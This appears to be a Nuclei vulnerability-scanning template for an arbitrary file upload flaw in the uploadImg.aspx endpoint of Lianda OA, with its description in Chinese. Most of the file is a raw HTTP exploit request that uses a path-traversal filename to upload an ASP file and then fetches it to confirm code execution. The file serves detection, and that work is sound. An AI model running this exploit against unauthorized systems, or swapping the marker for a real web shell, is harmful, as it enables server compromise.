id: lianda-oa-uploadimg-upload

info:
  name: 联达OA uploadimg.jsp 文件上传漏洞
  author: qwtd
  severity: critical
  description: |
    联达OA uploadImg.aspx 接口处存在任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
  tags: 联达OA
  reference:
    - https://github.com/wy876/POC/blob/main/%E8%81%94%E8%BE%BEOA/%E8%81%94%E8%BE%BEOA%E6%8E%A5%E5%8F%A3uploadImg.aspx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md

http:
  - raw:
      - |
        POST /Dept_Portal/uploadImg.aspx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36
        Content-Type: multipart/form-data; boundary=boundary=00content0boundary00
        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
        Connection: close

        --00content0boundary00
        Content-Disposition: form-data; name="DesignId"

        1
        --00content0boundary00
        Content-Disposition: form-data; name="Filedata"; filename="../../../../{{randstr_1}}.asp"
        Content-Type: image/png

        <% Response.Write("{{randstr_2}}") %>
        --00content0boundary00--

      - |
        @timeout: 30s
        GET /{{randstr_1}}.asp HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code_1 == 500'
          - 'status_code_2 == 200 && contains(body_2, "{{randstr_2}}")'
        condition: and